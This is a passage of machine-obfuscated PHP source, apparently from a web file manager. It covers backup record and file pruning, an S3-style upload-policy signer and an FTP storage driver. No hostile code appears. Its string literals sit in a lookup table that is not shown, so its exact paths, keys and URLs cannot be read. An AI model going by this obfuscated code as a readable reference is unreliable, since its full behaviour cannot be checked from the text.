$_SERVER[ïÃ°£«Ê]; $this->isManual(); self::$name = date($±¢šÚ¡[850]); if (!($ÅƒëÅøÑ = $this->model->lastItem())) { $ÅƒëÅøÑ = $this->initData(); } else { self::$name = $ÅƒëÅøÑ[$±¢šÚ¡[32]]; if ($ÅƒëÅøÑ[$±¢šÚ¡[851]] == $±¢šÚ¡[91]) { self::$name = date($±¢šÚ¡[259]); $š‡ª»‚Í = intval(_get($ÅƒëÅøÑ, $±¢šÚ¡[852], 0)); if (self::$manual == 0 && $ÅƒëÅøÑ[$±¢šÚ¡[32]] == self::$name) { $this->model->remove($ÅƒëÅøÑ[$±¢šÚ¡[487]]); } $ÅƒëÅøÑ = $this->initData($š‡ª»‚Í, $ÅƒëÅøÑ[$±¢šÚ¡[853]]); } else { $©°Ê†­  = $this->checkStore($ÅƒëÅøÑ[$±¢šÚ¡[853]]); if (!$©°Ê†­ ) { return !1; } } } if (!$ÅƒëÅøÑ) { return !1; } self::$option = $ÅƒëÅøÑ; } private function isManual() { $´«´¾–¶ = _get($GLOBALS, $_SERVER[ïÃ°£«Ê][854], 0); $´«´¾–¶ = intval($´«´¾–¶); self::$manual = $´«´¾–¶ && $´«´¾–¶ == 1 ? 1 : 0; } private function initData($ã¤ ÈàÎ = 0, $áÙÑäúá = '') { $î¤õ§Æø =& $_SERVER[ïÃ°£«Ê]; $ˆŞİÒõ› = $this->model->config(); if ($áÙÑäúá && $ˆŞİÒõ›[$î¤õ§Æø[853]] != $áÙÑäúá) { $ã¤ ÈàÎ = 0; } $”šÏ©Â = $this->checkStore($ˆŞİÒõ›[$î¤õ§Æø[853]]); if (!$”šÏ©Â) { return !1; } if (self::$manual == 1) { self::$name .= $î¤õ§Æø[11] . date($î¤õ§Æø[855]); } $öÔ¹Í¤ä = array($î¤õ§Æø[853] => $ˆŞİÒõ›[$î¤õ§Æø[853]], $î¤õ§Æø[32] => self::$name, $î¤õ§Æø[851] => 0, $î¤õ§Æø[168] => $ˆŞİÒõ›[$î¤õ§Æø[168]], $î¤õ§Æø[856] => self::$manual, $î¤õ§Æø[857] => array($î¤õ§Æø[858] => array($î¤õ§Æø[851] => 0), $î¤õ§Æø[859] => array($î¤õ§Æø[851] => 0, $î¤õ§Æø[860] => 0, $î¤õ§Æø[861] => 0, $î¤õ§Æø[33] => $î¤õ§Æø[12], $î¤õ§Æø[862] => 0, $î¤õ§Æø[863] => 0), $î¤õ§Æø[864] => array($î¤õ§Æø[851] => 0, $î¤õ§Æø[860] => 0, $î¤õ§Æø[861] => 0, $î¤õ§Æø[862] => 0, $î¤õ§Æø[863] => 0), $î¤õ§Æø[230] => array($î¤õ§Æø[851] => 0, $î¤õ§Æø[865] => 0, $î¤õ§Æø[866] => 0, $î¤õ§Æø[867] => 0, $î¤õ§Æø[868] => 0, $î¤õ§Æø[557] => $ã¤ ÈàÎ, $î¤õ§Æø[862] => 0, $î¤õ§Æø[863] => 0)), $î¤õ§Æø[862] => time(), $î¤õ§Æø[863] => 0); $ìÍ“ÁˆÔ = $this->model->insert($öÔ¹Í¤ä); $öÔ¹Í¤ä[$î¤õ§Æø[487]] = $ìÍ“ÁˆÔ; return $öÔ¹Í¤ä; } private function checkStore($˜¹ÓÙàª) { $õàÉí¹é = Model($_SERVER[ïÃ°£«Ê][869]); $ÆÜ‹§¦à = $õàÉí¹é->listData($˜¹ÓÙàª); $¹¤ÂŒØş = $õàÉí¹é->checkConfig($ÆÜ‹§¦à, !0); if ($¹¤ÂŒØş !== !0) { $this->message = $¹¤ÂŒØş; return !1; } return !0; } public static function get() { if (!self::$option) { $Ô‰ç¯¯ = Model($_SERVER[ïÃ°£«Ê][849]); $ù¼˜âè» = $Ô‰ç¯¯->findByName(self::$name); $Ô‰ç¯¯->parseContent($ù¼˜âè»); self::$option = $ù¼˜âè»; } return self::$option; } public static function set($ùª±Õõç) { $éµè¸¶ =& $_SERVER[ïÃ°£«Ê]; $¾õğğÒ = self::get(); foreach ($ùª±Õõç as $À´‹‹õˆ => $ú«ö³Ûù) { array_set_value($¾õğğÒ, $À´‹‹õˆ, $ú«ö³Ûù); } Model($éµè¸¶[849])->update($¾õğğÒ[$éµè¸¶[487]], $¾õğğÒ); self::$option = $¾õğğÒ; return self::$option; } public function keep() { $¤ûÆĞã =& $_SERVER[ïÃ°£«Ê]; $í¸ªå‹ş = self::get(); if (_get($í¸ªå‹ş, $¤ûÆĞã[870], 0) == $¤ûÆĞã[91]) { return; } $this->backupKeep($í¸ªå‹ş); self::set(array($¤ûÆĞã[870] => 1)); } private function backupKeep($ñ€ˆÁ¸ï) { $¯¾§îòã =& $_SERVER[ïÃ°£«Ê]; if (self::$manual == 1) { return; } $§à‡·Ç¤ = $this->model->listData(); if (empty($§à‡·Ç¤)) { return; } $©µ½¾«Ö = array(); $¼°ò¹ÛĞ = array(); $ïµÈÆıø = date($¯¾§îòã[871], strtotime($¯¾§îòã[872])); foreach ($§à‡·Ç¤ as $õ‚øŸ· => $çÎÖÉéé) { $Ïäõ«•Š = $çÎÖÉéé[$¯¾§îòã[32]]; if ($õ‚øŸ· < 7 || $çÎÖÉéé[$¯¾§îòã[856]] == $¯¾§îòã[91]) { $©µ½¾«Ö[] = $Ïäõ«•Š; continue; } $¨ı’¬Î” = substr($Ïäõ«•Š, 0, 6); if ($¨ı’¬Î” < $ïµÈÆıø) { continue; } if (!isset($¼°ò¹ÛĞ[$¨ı’¬Î”]) || $Ïäõ«•Š < $¼°ò¹ÛĞ[$¨ı’¬Î”]) { $¼°ò¹ÛĞ[$¨ı’¬Î”] = $Ïäõ«•Š; } if (substr($Ïäõ«•Š, 6, 2) == $¯¾§îòã[873]) { $¼°ò¹ÛĞ[$¨ı’¬Î”] = $Ïäõ«•Š; } } $©µ½¾«Ö = array_merge($©µ½¾«Ö, array_values($¼°ò¹ÛĞ)); $©µ½¾«Ö = array_unique($©µ½¾«Ö); foreach ($§à‡·Ç¤ as $çÎÖÉéé) { $Ïäõ«•Š = $çÎÖÉéé[$¯¾§îòã[32]]; if (!empty($Ïäõ«•Š) && in_array($Ïäõ«•Š, $©µ½¾«Ö)) { continue; } $this->model->remove($çÎÖÉéé[$¯¾§îòã[487]]); $ˆº¬âùª = $this->backupPath($ñ€ˆÁ¸ï); IO::remove($ˆº¬âùª, !1); } } private function backupPath($¢ÀàÒ) { $½ÚÙ¬ˆ‰ =& $_SERVER[ïÃ°£«Ê]; static $Íåóéú¦ = null; if (is_null($Íåóéú¦)) { $Íåóéú¦ = Model($½ÚÙ¬ˆ‰[874])->get($½ÚÙ¬ˆ‰[875]); } $½š˜àİÙ = $¢ÀàÒ[$½ÚÙ¬ˆ‰[32]]; $İË”ôû› = substr(md5($½ÚÙ¬ˆ‰[876] . $Íåóéú¦ . $½š˜àİÙ), 0, 8); return "\x7b\151\x6f\72{$¢ÀàÒ[$½ÚÙ¬ˆ‰[853]]}\x7d\57\x64\x61\164\x61\x62\141\163\145\57\x62\x61\143\x6b\165\160\x2f" . $½š˜àİÙ . $½ÚÙ¬ˆ‰[11] . $İË”ôû›; } public function db() { $º¤È€İİ =& $_SERVER[ïÃ°£«Ê]; $ÑàÒ÷šÈ = self::get(); if (_get($ÑàÒ÷šÈ, $º¤È€İİ[877], 0) == $º¤È€İİ[91]) { return !0; } $çÀ–²ìÏ = new BackupDb(); if (!$çÀ–²ìÏ->index()) { return !1; } self::set(array($º¤È€İİ[877] => 1)); return !0; } public function dbFile() { $ÅŠ—’¹ =& $_SERVER[ïÃ°£«Ê]; $Íø¡†Î§ = self::get(); if (_get($Íø¡†Î§, $ÅŠ—’¹[878], 0) == $ÅŠ—’¹[91]) { return !0; } $¨†‚‘­õ = new BackupDbFile(); if (!$¨†‚‘­õ->index()) { return !1; } self::set(array($ÅŠ—’¹[878] => 1)); return !0; } public function file() { $ãƒ½û¬‡ =& $_SERVER[ïÃ°£«Ê]; $ÕŸôá†• = self::get(); if (_get($ÕŸôá†•, $ãƒ½û¬‡[879], 0) == $ãƒ½û¬‡[91]) { return !0; } self::set(array($ãƒ½û¬‡[879] => 1, $ãƒ½û¬‡[851] => 1)); return !0; } public static function log($¹˜¿Ø´) { write_log($¹˜¿Ø´, $_SERVER[ïÃ°£«Ê][880]); } } goto Fƒ¼Ğ¹±±; B²³§ˆæÍ: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($•ñî¶²¦) { parent::__construct($•ñî¶²¦); $this->setSignVersion($_SERVER[ïÃ°£«Ê][247]); } public function uploadFormData($ÌÕ€‹ô«, $ó±óåÓ = 3600) { $éê©Ğù÷ =& $_SERVER[ïÃ°£«Ê]; $üŞİä‹œ = $éê©Ğù÷[229]; $à³Œıô = $éê©Ğù÷[257]; $Ö ŠŸ€è = $éê©Ğù÷[62]; $ÓÅ…Óôô = gmdate($éê©Ğù÷[258]); $ÆŸ²¿ˆ = gmdate($éê©Ğù÷[259]); $˜©ü„ˆ = $éê©Ğù÷[260]; $òÖÁ­¸‚ = $ó±óåÓ . $éê©Ğù÷[12]; $ÆÓ÷é¡Û = $éê©Ğù÷[261]; $¿ó°‹¸ = array($this->accessKey, $ÆŸ²¿ˆ, $this->region, $Ö ŠŸ€è, $˜©ü„ˆ); $šÂ°Õ£÷ = implode($éê©Ğù÷[8], $¿ó°‹¸); $Ã ¸—Ìå = array($éê©Ğù÷[262] => gmdate($éê©Ğù÷[1527], strtotime($éê©Ğù÷[264])), $éê©Ğù÷[265] => array(array($éê©Ğù÷[266] => $this->bucket), array($éê©Ğù÷[306] => $üŞİä‹œ), array($éê©Ğù÷[267], $éê©Ğù÷[268], $éê©Ğù÷[12]), array($éê©Ğù÷[267], $éê©Ğù÷[269], $éê©Ğù÷[12]), array($éê©Ğù÷[267], $éê©Ğù÷[307], $éê©Ğù÷[12]), array($éê©Ğù÷[270] => $ÆÓ÷é¡Û), array($éê©Ğù÷[271] => $šÂ°Õ£÷), array($éê©Ğù÷[272] => $à³Œıô), array($éê©Ğù÷[273] => $ÓÅ…Óôô), array($éê©Ğù÷[274] => $òÖÁ­¸‚))); $õ² ô = base64_encode(json_encode($Ã ¸—Ìå)); $Àõ Œç = hash_hmac($éê©Ğù÷[275], $ÆŸ²¿ˆ, $éê©Ğù÷[276] . $this->secret, !0); $’ûâòÎÇ = hash_hmac($éê©Ğù÷[275], $this->region, $Àõ Œç, !0); $É”óøíİ = hash_hmac($éê©Ğù÷[275], $Ö ŠŸ€è, $’ûâòÎÇ, !0); $ÀÄš†ÇÎ = hash_hmac($éê©Ğù÷[275], $˜©ü„ˆ, $É”óøíİ, !0); $Ü¸¶Ğ = hash_hmac($éê©Ğù÷[275], $õ² ô, $ÀÄš†ÇÎ); $õì‹ù« = array($éê©Ğù÷[246] => $éê©Ğù÷[12], $éê©Ğù÷[294] => $éê©Ğù÷[12], $éê©Ğù÷[306] => $üŞİä‹œ, $éê©Ğù÷[270] => $ÆÓ÷é¡Û, $éê©Ğù÷[277] => $õ² ô, $éê©Ğù÷[308] => $šÂ°Õ£÷, $éê©Ğù÷[309] => $à³Œıô, $éê©Ğù÷[310] => $ÓÅ…Óôô, $éê©Ğù÷[311] => $òÖÁ­¸‚, $éê©Ğù÷[312] => $Ü¸¶Ğ, $éê©Ğù÷[206] => $this->getHost()); return $õì‹ù«; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($èÚÃğç¸) { parent::__construct(); if (count($èÚÃğç¸) > 0) { $this->_init($èÚÃğç¸); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($›ÕØ½ºø) { $œ¾‡¸ÚŒ =& $_SERVER[ïÃ°£«Ê]; global $config; $this->appCharset = $config[$œ¾‡¸ÚŒ[1648]]; $this->systemCharset = $config[$œ¾‡¸ÚŒ[1649]]; if (isset($›ÕØ½ºø[$œ¾‡¸ÚŒ[1650]]) && $›ÕØ½ºø[$œ¾‡¸ÚŒ[1650]]) { $this->systemCharset = $›ÕØ½ºø[$œ¾‡¸ÚŒ[1650]]; } } public function iconvApp($± ²É¾) { return $this->iconvTo($± ²É¾, $this->systemCharset, $this->appCharset); } public function iconvSystem($ÈÉşÃÖÙ) { return $this->iconvTo($ÈÉşÃÖÙ, $this->appCharset, $this->systemCharset); } public function getPathOuter($åØíÄüâ) { $äè·ßï =& $_SERVER[ïÃ°£«Ê]; $ˆ»Ü¹œ— = $this->iconvApp($this->pathBase); $åØíÄüâ = $this->iconvApp($åØíÄüâ); if (substr($ˆ»Ü¹œ—, 0, 2) == $äè·ßï[1525]) { $ˆ»Ü¹œ— = BASIC_PATH . substr($ˆ»Ü¹œ—, 2); } if (substr($åØíÄüâ, 0, 2) == $äè·ßï[1525]) { $åØíÄüâ = BASIC_PATH . substr($åØíÄüâ, 2); } $ˆ»Ü¹œ— = KodIO::clear($ˆ»Ü¹œ—); $åØíÄüâ = KodIO::clear($åØíÄüâ); $åØíÄüâ = substr($åØíÄüâ, strlen($ˆ»Ü¹œ—)); if (empty($this->pathDriver)) { return $åØíÄüâ; } return $this->pathDriver . $äè·ßï[8] . ltrim($åØíÄüâ, $äè·ßï[8]); } private function _init($Îêã¯ Ó = array()) { $Éò¨£ş’ =& $_SERVER[ïÃ°£«Ê]; if (!function_exists($Éò¨£ş’[1651])) { throw new Exception(LNG($Éò¨£ş’[1652])); } $this->config = $Îêã¯ Ó; $this->charsetReset($Îêã¯ Ó); foreach ($Îêã¯ Ó as $Ä…şœşö => $îùÜÅœ†) { if (isset($this->{$Ä…şœşö})) { $this->{$Ä…şœşö} = $îùÜÅœ†; } } return $this->_login($Îêã¯ Ó); } private function _login($äéø€) { $éÓâ”âü =& $_SERVER[ïÃ°£«Ê]; static $³ˆÄòè = array(); $ˆ‚®Ïòª = md5(json_encode($äéø€)); if (isset($³ˆÄòè[$ˆ‚®Ïòª])) { foreach ($³ˆÄòè[$ˆ‚®Ïòª] as $üÌ‹ => $×¤ÕÌ¸‹) { $this->{$üÌ‹} = $×¤ÕÌ¸‹; } return !0; } $ó—Ò‘ìĞ = parse_url(trim($this->server, $éÓâ”âü[8])); $this->host = $ó—Ò‘ìĞ[$éÓâ”âü[206]]; $ŒÊ…®÷ù = isset($ó—Ò‘ìĞ[$éÓâ”âü[205]]) && $ó—Ò‘ìĞ[$éÓâ”âü[205]] == $éÓâ”âü[1653] ? !0 : !1; $this->scheme = $ŒÊ…®÷ù ? $éÓâ”âü[1654] : $éÓâ”âü[1655]; $this->port = isset($ó—Ò‘ìĞ[$éÓâ”âü[207]]) ? $ó—Ò‘ìĞ[$éÓâ”âü[207]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($éÓâ”âü[1656]) . $this->host . $éÓâ”âü[4] . $this->port, !0); return !1; } $²ÙÎ“·» = @ftp_login($this->connect, $this->username, $this->userpass); if (!$²ÙÎ“·») { $this->writeLog(LNG($éÓâ”âü[1657]) . $this->username, !0); return !1; } $this->ftpPath = @ftp_pwd($this->connect); @ftp_chdir($this->connect, $éÓâ”âü[8]); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $§Úóè¥¦ = $this->pasv == $éÓâ”âü[91] ? !0 : !1; @ftp_pasv($this->connect, $§Úóè¥¦); $³ˆÄòè[$ˆ‚®Ïòª] = array($éÓâ”âü[1658] => $this->connect, $éÓâ”âü[206] => $this->host, $éÓâ”âü[205] => $this->scheme, $éÓâ”âü[207] => $this->port); return $²ÙÎ“·»; } private function _isconn($Á ³öô  = true) { if (is_resource($this->connect)) { return !0; } if (!$Á ³öô ) { return !1; } return $this->_login($this->config); } public function mkfile($Ûíå·×è, $Š¿â«ß× = '', $ïĞ­îí = REPEAT_RENAME) { if ($this->setContent($Ûíå·×è, $Š¿â«ß×)) { return $this->getPathOuter($Ûíå·×è); } $this->writeLog(LNG($_SERVER[ïÃ°£«Ê][1659]), !0); return !1; } public function mkdir($¯•§È–Ò, $ô·„“š´ = REPEAT_SKIP) { $ô©ğ›šó =& $_SERVER[ïÃ°£«Ê]; if (!$¯•§È–Ò || $¯•§È–Ò == $ô©ğ›šó[8]) { return !0; } if (!$this->_isconn()) { return !1; } $¯•§È–Ò = $this->iconvSystem($¯•§È–Ò); if ($this->_isFolder($¯•§È–Ò) || @ftp_mkdir($this->connect, $¯•§È–Ò)) { return $this->getPathOuter($¯•§È–Ò); } if (!$this->mkdir($this->pathFather($¯•§È–Ò))) { return !1; } if ($¯•§È–Ò = @ftp_mkdir($this->connect, $¯•§È–Ò)) { return $this->getPathOuter($¯•§È–Ò); } $„‹‡«ïş = __FUNCTION__ . $ô©ğ›šó[1660]; $this->writeLog($„‹‡«ïş, !0); return !1; } public function copyFile($Ú½”‡ß, $µÒÛŸî«) { if (!$this->_isconn()) { return !1; } $º †²û¹ = $this->pathThis($this->iconvSystem($Ú½”‡ß)); $ˆßÑ”•’ = $this->tempFile($º †²û¹); $æÅµØÜè = $this->iconvApp($ˆßÑ”•’); $this->download($Ú½”‡ß, $æÅµØÜè); $ÒöªŒã³ = $this->upload($µÒÛŸî«, $æÅµØÜè); $this->tempFileRemve($ˆßÑ”•’); return $ÒöªŒã³; } public function moveFile($İèµ¹ª¿, $ÄÓÓÔ÷Ò) { if (!$this->_isconn()) { return !1; } $İèµ¹ª¿ = $this->iconvSystem($İèµ¹ª¿); $ÄÓÓÔ÷Ò = $this->iconvSystem($ÄÓÓÔ÷Ò); $éÂ‹ÆëË = @ftp_rename($this->connect, $İèµ¹ª¿, $ÄÓÓÔ÷Ò); if (!$éÂ‹ÆëË) { $this->writeLog(__FUNCTION__ . $_SERVER[ïÃ°£«Ê][1660], !0); return !1; } return $this->getPathOuter($ÄÓÓÔ÷Ò); } public function delFile($‚²¡÷¹ø) { if (!$this->_isconn()) { return !1; } $‚²¡÷¹ø = $this->iconvSystem($‚²¡÷¹ø); $êĞ—œ¯ = @ftp_delete($this->connect, $‚²¡÷¹ø); if (!$êĞ—œ¯) { $this->writeLog(__FUNCTION__ . $_SERVER[ïÃ°£«Ê][1660], !0); } return $êĞ—œ¯; } public function delFolder($¯ÖâÎ¸¡) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $îç§ªü² = $àş‘œÔ¨ = array(); $this->fileList($¯ÖâÎ¸¡, $îç§ªü², $àş‘œÔ¨, !0); $this->listItemCache = !0; foreach ($àş‘œÔ¨ as $ÕØéÁİ) { $·ßÓ°ËÜ = $this->iconvSystem($ÕØéÁİ[$_SERVER[ïÃ°£«Ê][32]]); $·ş¡·†Í = @ftp_delete($this->connect, $·ßÓ°ËÜ); if (!$·ş¡·†Í) { return !1; } } foreach ($îç§ªü² as $·ßÓ°ËÜ) { $·ßÓ°ËÜ = $this->iconvSystem($·ßÓ°ËÜ); $·ş¡·†Í = @ftp_rmdir($this->connect, $·ßÓ°ËÜ); if (!$·ş¡·†Í) { return !1; } } $¯ÖâÎ¸¡ = $this->iconvSystem($¯ÖâÎ¸¡); return @ftp_rmdir($this->connect, $¯ÖâÎ¸¡); } public function rename($®Öãø¼, $ìæ¶‘£Ô) { $ŒÍ×Ç«è =& $_SERVER[ïÃ°£«Ê]; if (!$this->_isconn()) { return !1; } $»Ÿä§Ó = $this->fileNameAuto($this->pathFather($®Öãø¼), $ìæ¶‘£Ô); $»Ÿä§Ó = $this->iconvSystem($»Ÿä§Ó); $®Öãø¼ = $this->iconvSystem($®Öãø¼); $½¬‰ÊØ = $this->pathFather($®Öãø¼); $‘æ©ùàÂ = rtrim($½¬‰ÊØ, $ŒÍ×Ç«è[8]) . $ŒÍ×Ç«è[8] . $»Ÿä§Ó; $Šš€É™­ = @ftp_rename($this->connect, $®Öãø¼, $‘æ©ùàÂ); if (!$Šš€É™­) { $this->writeLog(__FUNCTION__ . $ŒÍ×Ç«è[1660], !0); return !1; } $‘æ©ùàÂ = $this->iconvApp($‘æ©ùàÂ); return $this->getPathOuter($‘æ©ùàÂ); } private function folderInfo($‰£ö‰ó, $‚…ÆêÒ = false) { $¿•¹–‹ú =& $_SERVER[ïÃ°£«Ê]; $»¼úõÅ = array($¿•¹–‹ú[32] => $this->pathThis($‰£ö‰ó), $¿•¹–‹ú[87] => $this->getPathOuter($¿•¹–‹ú[8] . $‰£ö‰ó), $¿•¹–‹ú[33] => $¿•¹–‹ú[78]); if ($‚…ÆêÒ) { return $»¼úõÅ; } $»¼úõÅ[$¿•¹–‹ú[231]] = $»¼úõÅ[$¿•¹–‹ú[88]] = 0; $»¼úõÅ[$¿•¹–‹ú[232]] = $»¼úõÅ[$¿•¹–‹ú[233]] = !0; return $»¼úõÅ; } private function fileInfo($Ê¤ÏÈÇË, $š€‡¦ï› = false, $÷²ÏÂË = array()) { $š³Ÿì©§ =& $_SERVER[ïÃ°£«Ê]; $ÄÜÏÛÔ = array($š³Ÿì©§[32] => $this->pathThis($Ê¤ÏÈÇË), $š³Ÿì©§[87] => $this->getPathOuter($š³Ÿì©§[8] . $Ê¤ÏÈÇË), $š³Ÿì©§[33] => $š³Ÿì©§[230], $š³Ÿì©§[79] => isset($÷²ÏÂË[$š³Ÿì©§[79]]) ? $÷²ÏÂË[$š³Ÿì©§[79]] : 0, $š³Ÿì©§[166] => $this->ext($Ê¤ÏÈÇË)); if ($š€‡¦ï›) { return $ÄÜÏÛÔ; } $ÄÜÏÛÔ[$š³Ÿì©§[231]] = $ÄÜÏÛÔ[$š³Ÿì©§[88]] = 0; $ÄÜÏÛÔ[$š³Ÿì©§[232]] = $ÄÜÏÛÔ[$š³Ÿì©§[233]] = !0; $ªÎÆ¬¬³ = $this->iconvSystem($Ê¤ÏÈÇË); $ÄÜÏÛÔ[$š³Ÿì©§[88]] = @ftp_mdtm($this->connect, $ªÎÆ¬¬³); if (empty($÷²ÏÂË)) { $÷²ÏÂË = $this->objectMeta($Ê¤ÏÈÇË); if (!$÷²ÏÂË) { return $ÄÜÏÛÔ; } } $ÄÜÏÛÔ[$š³Ÿì©§[79]] = $÷²ÏÂË[$š³Ÿì©§[79]]; return $ÄÜÏÛÔ; } public function size($ÁÌù¥©å) { $ƒ®˜Ô¹Ó = $this->objectMeta($ÁÌù¥©å); return $ƒ®˜Ô¹Ó ? $ƒ®˜Ô¹Ó[$_SERVER[ïÃ°£«Ê][79]] : 0; } public function info($òÑ°„÷á) { if ($this->isFile($òÑ°„÷á)) { return $this->fileInfo($òÑ°„÷á, 0); } else { if ($this->isFolder($òÑ°„÷á)) { return $this->folderInfo($òÑ°„÷á); } } return !1; } private function fileList($õ¢œØÖ—, &$®ÇÃææå, &$±ÒÉÂ§Û, $Ë¡Ù›ªØ = false) { $ƒõˆ™ı =& $_SERVER[ïÃ°£«Ê]; $õ¢œØÖ— = $this->iconvSystem($õ¢œØÖ—); if (!$this->isFolder($õ¢œØÖ—)) { return !1; } $õ¢œØÖ— = rtrim($õ¢œØÖ—, $ƒõˆ™ı[8]) . $ƒõˆ™ı[8]; check_abort(); $î¤İ ”Ğ = @ftp_rawlist($this->connect, $õ¢œØÖ—); if (!$î¤İ ”Ğ) { $î¤İ ”Ğ = array(); } $Éå®ÎÚÏ = array($ƒõˆ™ı[10] => 1, $ƒõˆ™ı[1470] => 1); foreach ($î¤İ ”Ğ as $µâ»»ÎË) { $µ¾ÀÒÈ× = $this->_listItem($µâ»»ÎË); if ($µ¾ÀÒÈ×[0] == $ƒõˆ™ı[860]) { continue; } $úù¢­‘º = $µ¾ÀÒÈ×[8]; if (empty($úù¢­‘º) && $úù¢­‘º !== $ƒõˆ™ı[228] || isset($Éå®ÎÚÏ[$úù¢­‘º])) { continue; } $úù¢­‘º = $this->iconvApp($õ¢œØÖ— . ltrim($úù¢­‘º, $ƒõˆ™ı[8])); $äÛØÌÓï = array($ƒõˆ™ı[32] => $úù¢­‘º, $ƒõˆ™ı[33] => $ƒõˆ™ı[230], $ƒõˆ™ı[79] => $µ¾ÀÒÈ×[4]); if (substr($µâ»»ÎË, 0, 1) == $ƒõˆ™ı[1661]) { $äÛØÌÓï[$ƒõˆ™ı[33]] = $ƒõˆ™ı[78]; $äÛØÌÓï[$ƒõˆ™ı[79]] = 0; } $Ùå“–´û = $äÛØÌÓï[$ƒõˆ™ı[33]] == $ƒõˆ™ı[78] ? !0 : !1; $this->cacheMethodInfoSet($úù¢­‘º, $Ùå“–´û, $äÛØÌÓï); if ($Ùå“–´û) { $®ÇÃææå[] = $úù¢­‘º; if ($Ë¡Ù›ªØ) { $this->fileList($úù¢­‘º, $®ÇÃææå, $±ÒÉÂ§Û, $Ë¡Ù›ªØ); } continue; } $±ÒÉÂ§Û[] = $äÛØÌÓï; } $this->cacheMethodInfoSet($õ¢œØÖ—, !0); } private function _listItem($ÂùûäÆ) { if (empty($ÂùûäÆ)) { return array(); } $½Ó —ßÙ = preg_split($_SERVER[ïÃ°£«Ê][1662], $ÂùûäÆ); if (count($½Ó —ßÙ) <= 9) { return $½Ó —ßÙ; } $½Ó —ßÙ[8] = trim(substr($ÂùûäÆ, strpos($ÂùûäÆ, $½Ó —ßÙ[7]) + strlen($½Ó —ßÙ[7]))); return array_splice($½Ó —ßÙ, 0, 9); } public function listPath($ÈÍØÄÛ¡, $Õù¢©á = false) { $ÛïŒœ³ã =& $_SERVER[ïÃ°£«Ê]; if (!$this->_isconn()) { return !1; } $ßÆ×¼µ = $ëô¤ùä® = array(); $this->fileList($ÈÍØÄÛ¡, $ßÆ×¼µ, $ëô¤ùä®); foreach ($ßÆ×¼µ as $­íúàÄ¦ => $Œ«­±¤Ñ) { $ßÆ×¼µ[$­íúàÄ¦] = $this->folderInfo($Œ«­±¤Ñ, $Õù¢©á); } foreach ($ëô¤ùä® as $­íúàÄ¦ => $Œ«­±¤Ñ) { $ëô¤ùä®[$­íúàÄ¦] = $this->fileInfo($Œ«­±¤Ñ[$ÛïŒœ³ã[32]], $Õù¢©á, $Œ«­±¤Ñ); } return array($ÛïŒœ³ã[85] => $ßÆ×¼µ, $ÛïŒœ³ã[86] => $ëô¤ùä®); } public function has($‚Ğ÷Ôõ, $¤•‹â·ö = false, $ŞÀıİæú = true) { $ç“™ææÜ =& $_SERVER[ïÃ°£«Ê]; $Å‰éú‡Ã = $¼É£œ¤‹ = array(); $åµ£©Ç… = $¤•‹â·ö ? !0 : !1; $this->fileList($‚Ğ÷Ôõ, $Å‰éú‡Ã, $¼É£œ¤‹, $åµ£©Ç…); if ($¤•‹â·ö) { return array($ç“™ææÜ[239] => count($¼É£œ¤‹), $ç“™ææÜ[240] => count($Å‰éú‡Ã)); } if ($ŞÀıİæú) { if (count($¼É£œ¤‹)) { return !0; } } else { if (count($Å‰éú‡Ã)) { return !0; } } return !1; } public function listAll($¿“ÈŸƒÒ) { $İ„øÈŒğ =& $_SERVER[ïÃ°£«Ê]; if (!$this->_isconn()) { return !1; } $”¸†¥Ï = $ÊøÊ½€À = array(); $this->fileList($¿“ÈŸƒÒ, $”¸†¥Ï, $ÊøÊ½€À, !0); $øŒ¶äûù = array_to_keyvalue($ÊøÊ½€À, $İ„øÈŒğ[32]); foreach ($”¸†¥Ï as $‘œŸ†ó) { if (is_string($‘œŸ†ó)) { $øŒ¶äûù[$‘œŸ†ó] = array($İ„øÈŒğ[79] => 0); } } return $this->listAllFiles($¿“ÈŸƒÒ, $øŒ¶äûù); } public function getContent($‘Ëˆ’½”) { if (!$this->_isconn()) { return !1; } $‘Ëˆ’½” = $this->iconvSystem($‘Ëˆ’½”); return $this->fileSubstr($‘Ëˆ’½”); } public function setContent($ÆÈÁ¶Ñ¹, $€ò÷©„Ğ = '') { if (!$this->_isconn()) { return !1; } $³Íëˆ¹ = $this->pathThis($this->iconvSystem($ÆÈÁ¶Ñ¹)); $¼İ€Éş‚ = $this->tempFile($³Íëˆ¹); file_put_contents($¼İ€Éş‚, $€ò÷©„Ğ); $ÙúàÎ‰  = $this->upload($ÆÈÁ¶Ñ¹, $this->iconvApp($¼İ€Éş‚)); $this->tempFileRemve($¼İ€Éş‚); return $ÙúàÎ‰ ; } public function fileSubstr($»«¶ŞÅÑ, $Ê°ÆôÍ‘ = 0, $‘¯Å«Éç = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($»«¶ŞÅÑ, $Ê°ÆôÍ‘, $‘¯Å«Éç); } private function ftpRequest($Âë²ÔÛ, $‚…“¶ò = 0, $¡«é€Á¿ = false) { $¶òš§Í´ =& $_SERVER[ïÃ°£«Ê]; $Âë²ÔÛ = $¶òš§Í´[8] . ltrim(str_ltrim($Âë²ÔÛ, $this->ftpPath), $¶òš§Í´[8]); $Âë²ÔÛ = $this->iconvSystem($Âë²ÔÛ); $¸ØŒİß¸ = $this->scheme . $this->host . $¶òš§Í´[4] . $this->port; $ö¤•È»ú = curl_init(); curl_setopt($ö¤•È»ú, CURLOPT_URL, $¸ØŒİß¸ . $this->pathEncode($Âë²ÔÛ)); curl_setopt($ö¤•È»ú, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($¡«é€Á¿) { $µÂÁùıÍ = $‚…“¶ò + $¡«é€Á¿ - 1; curl_setopt($ö¤•È»ú, CURLOPT_RANGE, "{$‚…“¶ò}\55{$µÂÁùıÍ}"); } curl_setopt($ö¤•È»ú, CURLOPT_RETURNTRANSFER, 1); $ıÉâ¨ñ° = curl_exec($ö¤•È»ú); curl_close($ö¤•È»ú); return $ıÉâ¨ñ°; } public function upload($æÏòú¬, $úÖ…º², $’È““ò = false, $ù±ı…íŞ = REPEAT_REPLACE) { if (!$úÖ…º² || !@file_exists($úÖ…º²)) { return !1; } if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($æÏòú¬))) { return !1; } 